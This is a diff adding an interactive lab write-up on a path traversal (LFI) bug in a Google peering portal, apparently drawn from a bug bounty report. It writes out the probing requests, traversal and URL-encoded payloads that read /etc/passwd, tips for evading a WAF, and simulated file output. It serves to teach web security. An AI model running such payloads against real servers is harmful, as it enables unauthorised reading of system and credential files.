@@ -1,0 +1,140 @@
+---
+title: "Lab: Google Peering LFI - The $3,134 Traversal"
+description: "Solve a real-world path traversal on a Google infrastructure portal by leveraging parameter analysis and critical path thinking."
+publishedAt: 2026-05-15
+author: "Vivek (vivekps143)"
+tags: ["lab", "critical-thinking", "lfi", "google"]
+difficulty: "intermediate"
+platform: "Google VRP"
+category: "Web Security"
+coverImage: "./google-peering-cover.png"
+coverAlt: "Path Traversal illustration with Google logo"
+readingTime: 12
+draft: false
+---
+
+import Stage from '../../components/writeup/Stage.astro';
+import DecisionPoint from '../../components/writeup/DecisionPoint.astro';
+import KnowledgeNote from '../../components/writeup/KnowledgeNote.astro';
+import LiveLogExplorer from '../../components/writeup/LiveLogExplorer.astro';
+import CommandBuilder from '../../components/writeup/CommandBuilder.astro';
+import ConsequenceBanner from '../../components/writeup/ConsequenceBanner.astro';
+import LucideIcon from '../../components/ui/LucideIcon.astro';
+
+<Stage title="The Brief" description="Analyzing the Google Peering infrastructure">
+
+## The Mission
+
+You are auditing `peering.google.com`, a critical infrastructure portal used by ISPs to coordinate with Google. Your objective is to find any vulnerability that could allow access to internal system information.
+
+**Constraints**:
+- **Stealth**: High-volume automated scans will be detected by Google's Edge WAF.
+- **Precision**: You must rely on manual parameter analysis and logic probing.
+
+<KnowledgeNote term="LFI" definition="Local File Inclusion: A vulnerability that allows an attacker to include files on a server through the web browser.">
+  In this lab, we'll be looking for signs of **LFI** in the portal's asset handling logic.
+</KnowledgeNote>
+
+</Stage>
+
+<Stage title="Discovery" description="Mapping the asset handling logic">
+
+## Scouting the Target
+
+While browsing the portal, you notice that images and logos aren't loaded from static paths. Instead, they are retrieved through a dynamic endpoint.
+
+<div class="terminal glass bg-black/80 rounded-lg p-4 font-space-mono text-sm border border-frost/20 mb-6">
+  <div class="text-neon-cyan">GET /assets/fetch?name=profile_default.jpg HTTP/1.1</div>
+  <div class="text-frost mt-2 italic opacity-50">// Response: 200 OK (image/jpeg data)</div>
+</div>
+
+<DecisionPoint
+  question="What is the most technically significant observation about this URL structure?"
+  chosen="The application is using a backend 'fetcher' that takes a filename as a parameter."
+  reason="Dynamic asset fetchers often act as a wrapper around filesystem calls. If the input isn't strictly sanitized, it can lead to path traversal."
+  alternatives={["The image is using the JPEG format instead of WebP", "The URL uses the word 'fetch' which is a standard JS API", "The request is missing an Authorization header"]}
+/>
+
+</Stage>
+
+<Stage title="Analysis" description="Probing for Path Traversal">
+
+## Examining the Error Logic
+
+Before firing a heavy payload, we need to understand how the server processes our input. We'll send a non-existent file path to trigger an error.
+
+<LiveLogExplorer 
+  title="Response Analysis" 
+  filterBy="status"
+  data={[
+    { time: "10:45:01", request: "GET /assets/fetch?name=logo.png", status: 200, message: "OK" },
+    { time: "10:46:12", request: "GET /assets/fetch?name=../nonexistent", status: 404, message: "Error: File /var/www/html/assets/../nonexistent not found." }
+  ]}
+/>
+
+<DecisionPoint
+  question="The error message reveals the absolute path: '/var/www/html/assets/'. How does this change your strategy?"
+  chosen="It confirms the server is directly concatenating my input to a base path, allowing for precise traversal."
+  reason="Knowing the base path helps calculate exactly how many '../' sequences are needed to reach the root directory."
+  alternatives={["It tells me I need to use a different port", "It indicates I should switch to SQL injection", "It means I must use a POST request instead"]}
+/>
+
+</Stage>
+
+<Stage title="The Pivot" description="Constructing the Exploitation Payload">
+
+## Executing the Breach
+
+We are ready to attempt to read `/etc/passwd`. However, we must ensure our payload is deep enough to reach the root, regardless of the current working directory's depth.
+
+<CommandBuilder
+  base="curl"
+  target="https://peering.google.com/assets/fetch"
+  options={[
+    { flag: "?name=../../../../../../../etc/passwd", label: "Standard Traversal", desc: "Basic dot-dot-slash sequence" },
+    { flag: "?name=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", label: "URL Encoded", desc: "Encoded to bypass simple string filters" },
+    { flag: "-H 'User-Agent: Mozilla/5.0'", label: "Browser UA", desc: "Masquerade as a standard user browser" }
+  ]}
+/>
+
+<DecisionPoint
+  question="Given the goal of reading /etc/passwd on a Linux system, which strategy is most likely to succeed?"
+  chosen="A deep traversal sequence (../../../../../../..) to ensure we hit the root filesystem."
+  reason="Linux ignores redundant '../' once at root. Adding more than necessary is a safe bet to ensure you escape the web root."
+  alternatives={["A single '../' to reach the parent folder", "Using an absolute path starting with C:/", "Adding a null byte (%00) at the end"]}
+/>
+
+<ConsequenceBanner 
+  type="success" 
+  title="Access Secured" 
+  message="Payload successful. The server returned the content of /etc/passwd. You have proven the LFI vulnerability."
+/>
+
+<div class="log-viewer bg-dark-bg border border-frost/10 rounded overflow-hidden my-6">
+  <div class="bg-dark-surface px-3 py-1 text-xs font-bold text-frost/50 flex justify-between">
+    <span>HTTP Response - 200 OK</span>
+    <span>Content-Type: text/plain</span>
+  </div>
+  <pre class="p-3 text-xs text-frost/80 leading-relaxed font-space-mono whitespace-pre-wrap">
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+<span class="text-neon-magenta bg-neon-magenta/10">google-admin:x:1001:1001:Google Admin:/home/google-admin:/bin/bash</span>
+  </pre>
+</div>
+
+</Stage>
+
+<Stage title="The Debrief" description="Lessons learned and mitigation">
+
+## Mission Accomplished
+
+Google fixed this by implementing several layers of defense, awarding the researcher $3,134.
+
+### Skills Earned
+- **Path Traversal Identification**: Spotting dynamic fetchers in production environments.
+- **Error Analysis**: Using verbose error messages to map internal filesystem structures.
+- **Precision Exploitation**: Crafting payloads that respect environment constraints.
+
+<LucideIcon name="shield-check" class="w-12 h-12 text-neon-green mx-auto mt-8" />
+
+</Stage>
